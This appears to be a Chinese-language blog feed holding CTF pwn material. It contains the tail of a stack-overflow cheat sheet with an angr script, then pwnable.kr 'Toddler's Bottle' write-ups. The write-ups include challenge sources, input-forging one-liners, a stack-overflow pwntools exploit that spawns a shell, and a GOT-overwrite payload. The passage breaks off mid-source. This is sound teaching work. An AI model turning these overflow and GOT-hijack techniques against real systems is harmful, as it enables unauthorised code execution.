class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> basic_symbolic_execution ()</span><br></pre></td></tr></table></figure><p> 假设有如下存在栈溢出的程序，但是首先需要我们输入一个密码才可以进入触发栈溢出的函数。为了简化难度，直接假设密码比较简单，但是实际情况下手工逆向出密码非常复杂。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> main (void)&#123;</span><br><span class="line">    char buf [<span class="number">20</span>]</span><br><span class="line">    char name [<span class="number">9</span>];</span><br><span class="line">    scanf (<span class="string">&quot;% s&quot;</span>,name);</span><br><span class="line">    <span class="keyword">if</span>(!strcmp (name,<span class="string">&quot;jsk&quot;</span>))&#123;</span><br><span class="line">        read (<span class="number">0</span>, buf, <span class="number">0x20</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        printf (<span class="string">&quot;failed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 求解这类问题的 angr 脚本如下。其中 pwn 为二进制程序名，find 参数为成功的路径的地址，对应到程序中就是 main 中调用 read 的地址，avoid 参数为失败的路径的地址，对应到程序中就是 main 中调用 printf 的地址，最后打印出找到的可以到达成功路径地址的输入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = angr.Project (<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line">    state = p.factory.entry_state ()</span><br><span class="line">    sm = p.factory.simgr (state)</span><br><span class="line">    sm.explore (find=<span class="number">0x0804939D</span>, avoid=<span class="number">0x080493B1</span>)</span><br><span class="line">    <span class="built_in">print</span>(sm.found [<span class="number">0</span>].posix.dumps (<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main ()</span><br></pre></td></tr></table></figure><p> 一个真实的 ctf 示例如下，首先要求我们输入一个 key，通过一系列检查这个函数才会返回 1，表示输入了正确的 key，才可能会触发后续的漏洞利用，在这种场景下 angr 是最合适的。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/15.png"></p><h2 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h2><p> 检查程序开启的 seccomp 沙箱策略。安装如下。前文中的 dockerfile 集成了 seccomp-tools。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure><p> 如下图所示。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/14.png"></p><p> 以上图为例，只允许的系统调用为 re_sigreturn，sigreturn，exit_group，exit，open，read，write。需要注意的是要是用该工具检查 elf 的沙箱策略，该工具必须先运行一遍 elf 文件。</p>]]></content>
    
    
    <summary type="html">Stack Overflow payloads and attack methods.</summary>
    
    
    
    <category term="CheatSheet" scheme="https://srpopty.github.io/categories/CheatSheet/"/>
    
    
    <category term="Pwn" scheme="https://srpopty.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.KR Writeup of Toddler&#39;s Bottle</title>
    <link href="https://srpopty.github.io/2021/08/11/Pwnable.KR-Writeup-of-Toddler&#39;s-Bottle/"/>
    <id>https://srpopty.github.io/2021/08/11/Pwnable.KR-Writeup-of-Toddler&#39;s-Bottle/</id>
    <published>2021-08-11T05:59:25.000Z</published>
    <updated>2021-08-11T05:59:25.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Challenges in <a href="https://pwnable.kr/">Pwnable.kr</a></p></blockquote><h1 id="fd-1-pt"><a href="#fd-1-pt" class="headerlink" title="fd (1 pt)"></a>fd (1 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buf [<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv [], <span class="type">char</span>* envp [])</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;pass argv [1] a number\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> fd = atoi (argv [<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">    len = read (fd, buf, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">        system (<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以控制的是 argv [1]，最终的目标是 <code>read (fd, buf, 32)</code> 之后的 buf 中的字符串为 <code>LETMEWIN\n</code>，所以我们可以将 fd 控制为从标准输入中读取，即 fd 为 0，则需要满足 <code>atoi (argv [1] ) == 0x1234</code>，那么直接执行如下命令即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print (&#x27;LETMEWIN&#x27;)&quot;</span>|./fd `python -c <span class="string">&quot;print (0x1234)&quot;</span>`</span><br></pre></td></tr></table></figure><p>首先 <code>python -c&quot;print (&#39;LETMEWIN&#39;)&quot;</code>试 fd 程序可以从标准输入中读取 <code>LETMEWIN\n</code> 字符串，<code>python -c &quot;print (0x1234)&quot;</code> 则可以将 0x1234 通过 argv 传递给 fd。</p><h1 id="collision-3-pt"><a href="#collision-3-pt" class="headerlink" title="collision (3 pt)"></a>collision (3 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line">    <span class="type">int</span>* ip = (<span class="type">int</span>*) p;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">        res += ip [i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv [])</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage : % s [passcode]\n&quot;</span>, argv [<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv [<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hashcode == check_password ( argv [<span class="number">1</span>] ))&#123;</span><br><span class="line">        system (<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还是通过 argv 传递一个参数，但是需要通过 <code>check_passcode</code> 函数的检查，而且必须为 20 个字节，最后需要 <code>check_passcode</code> 返回值为 <code>0x21dd09ec</code>。</p><p>首先 <code>check_passcode</code> 函数将输入的 char* 转为 int*，由于这是一个 32 位的程序，这样在这个 int* 的数组中一共有 5 个 int，32 位程序中每一个 int 占 4 个字节，将这五个 int 加起来就是这个函数的返回值。假如我们输入的 passcode 中前 4 个字符为 <code>aaaa</code>，那么在内存中就是 <code>\x61\x61\x61\x61</code>，转换为 int 就变成了 <code>0x61616161</code>，所以我们的目的就是让这 5 组字符串的和为 <code>0x21dd09ec</code>。需要注意的一点是大小端排序的问题，例如输入的是 <code>0x01020304</code>，那么在内存中就变成了 <code>0x04030201</code>。</p><p>其实满足条件的字符串有很多，其中的一种为 <code>0x01010101+0x01010101+0x01010101+0x11314141+0xda8c5a8 == 0x21dd09ec</code>，那么直接执行如下命令即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col `python -c <span class="string">&quot;print (&#x27;\x01\x01\x01\x01&#x27;*3+&#x27;\x41\x41\x31\x11&#x27;+&#x27;\xa8\xc5\xa8\x0d&#x27;)&quot;</span>`</span><br></pre></td></tr></table></figure><h1 id="bof-5-pt"><a href="#bof-5-pt" class="headerlink" title="bof (5 pt)"></a>bof (5 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">    <span class="type">char</span> overflowme [<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">    gets (overflowme);    <span class="comment">//smash me!</span></span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">        system (<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv [])</span>&#123;</span><br><span class="line">    func (<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个很简单的栈溢出，溢出的目标就是将栈上的局部变量 key 的值改为 <code>0xcafebabe</code>，之后就白送一个 shell。习惯性先用 checksec 检查一下，该开的都开了。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/1.png"></p><p>看一下 key 的位置在哪，算出来从 eax 到 key 的距离为 52 个字节，直接填充 52 个字节的垃圾数据然后修改 key。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/2.png"></p><p>最终的 exp 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">PORT = <span class="number">9000</span></span><br><span class="line"></span><br><span class="line">context.update (terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update (log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF (&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&quot;./bof&quot;</span>)</span><br><span class="line">pg = cyclic_gen ()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote (HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process (elf.path, env=env)</span><br><span class="line"></span><br><span class="line">conn.sendline (pg.get (<span class="number">52</span>) + p32 (<span class="number">0xcafebabe</span>))</span><br><span class="line">conn.interactive ()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="flag-7-pt"><a href="#flag-7-pt" class="headerlink" title="flag (7 pt)"></a>flag (7 pt)</h1><p>这是一个逆向题，只给了一个二进制文件，先用 file 看一下，发现是 64 位程序，直接用 ida64 打开。函数非常非常多，先打开 strings 窗口看看有哪些字符串，首先看到的就是 upx，这个程序很可能用 upx 加过壳，先用 upx 脱壳拿到真正的程序。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/3.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/4.png"></p><p>脱了壳以后就可以看到源程序了，直接 IDA 一把梭。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/5.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/6.png"></p><h1 id="passcode-10-pt"><a href="#passcode-10-pt" class="headerlink" title="passcode (10 pt)"></a>passcode (10 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">login</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> passcode1;</span><br><span class="line">    <span class="type">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;% d&quot;</span>, passcode1);</span><br><span class="line">    fflush (<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;% d&quot;</span>, passcode2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                system (<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> name [<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome % s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    welcome ();</span><br><span class="line">    login ();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//something after login...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题还是一个栈溢出，不过是基于栈重叠的溢出。程序先后调用了 welcome 和 login 两个函数，在 welcome 函数中有一个 100 字节的 buf，scanf 中也没有任何溢出，而执行完 welcome 以后紧接着就执行 login 函数，在 login 函数中我们需要改变两个局部变量 passcode1 和 passcode2 的值才能拿到 flag。</p><p>需要注意的是，当一个函数执行完毕后，并不会将该函数栈上的数据清空，仅改变 esp 和 ebp 的值，所以在执行完 welcome 以后，继续执行 login 的时候，我们在 welcome 中输入的 buf 中 100 个字节还保存在栈上，只不过这时候的栈帧已经变成了 login 的栈帧，也就是说：我们对 welcome 函数中 buf 的修改，是有可能影响到 login 函数中局部变量的值，我们来实验一下。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/7.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/8.png"></p><p>可以看到，在 welcome 中对 buf 从 0xff940298 一直到 0xff9402fc，而在 login 中，passcode1 的的地址为 esp+4 即 0xff9402e4，小于 0xff9402fc，接着 scanf 输入到 passcode1 的时候我们就可以向任意地址写一个数字（scanf 的参数是 % d），不过可惜的是 buf 影响不到 passcode2，还是需要想办法绕过 <code>passcode1==338150 &amp;&amp; passcode2==13371337</code> 的判断。</p><p>既然可以修改任意地址到值为一个数字，那么我们就可以通过修改 got 表实现任意地址到跳转，在第一次 scanf 以后就有一个 fflush 函数，这是一个 libc 的函数，因此可以修改 fflush 的 got 表劫持控制流直接绕过 if 判断跳转到执行 system 的地址，即 0x80485d7，但是 scanf 只接受一个数字，因此就需要将 0x80485d7 以 int 的形式输入即可。最后在 bash 中执行如下 payload。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print (&#x27;a&#x27;*96+&#x27;\x04\xa0\x04\x08&#x27;+&#x27;134514135&#x27;)&quot;</span>|./passcode</span><br></pre></td></tr></table></figure><h1 id="random-1-pt"><a href="#random-1-pt" class="headerlink" title="random (1 pt)"></a>random (1 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> random;</span><br><span class="line">    random = rand ();    <span class="comment">//random value!</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;% d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Good!\n&quot;</span>);</span><br><span class="line">        system (<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很经典的 random 伪随机数，由于没有用 srand 设置随机数种子，默认会使用 1 作为种子，因此只需要在程序运行的时候用 gdb 看一下 rand 函数返回的第一个数字即可，为 0x6b8b4567，和 0xdeadbeef 异或一下就得到最后的结果 3039230856。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/9.png"></p><h1 id="input-4-pt"><a href="#input-4-pt" class="headerlink" title="input (4 pt)"></a>input (4 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv [], <span class="type">char</span>* envp [])</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//argv</span></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv [<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span 